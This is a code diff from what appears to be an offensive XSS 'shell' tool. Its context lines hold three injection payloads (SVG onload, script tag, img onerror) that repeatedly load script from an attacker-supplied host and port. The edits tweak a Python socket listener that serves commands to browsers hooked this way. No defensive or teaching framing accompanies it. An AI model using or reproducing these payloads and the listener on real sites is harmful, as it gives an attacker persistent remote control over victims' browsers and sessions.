@@ -53,7 +53,6 @@ payload = '''
  - SVG: %s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)>
 %s - SCRIPT: %s<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)</script>
 %s - IMG: %s<img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)>
-
 ''' % (blue, host, port, white, blue, host, port, white, blue, host, port)
 
         
@@ -67,6 +66,7 @@ Connection: close
 def shell():
     while 1:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
         if secs != 0:
             s.settimeout(secs)
@@ -75,7 +75,7 @@ def shell():
             break
             
         s.bind(('0.0.0.0', port))
-        s.listen(0)
+        s.listen(2)
         
         try:
             c, a = s.accept()
@@ -96,7 +96,6 @@ def shell():
             c.send(form + buffer.encode())
             c.shutdown(socket.SHUT_RDWR)
             c.close()
-            s.shutdown(socket.SHUT_RDWR)
             s.close()
         except KeyboardInterrupt:
             if sys.platform == 'win32':
@@ -150,7 +149,6 @@ def main():
             
         c.shutdown(socket.SHUT_RDWR)
         c.close()
-        s.shutdown(socket.SHUT_RDWR)
         s.close()
         shell()
         
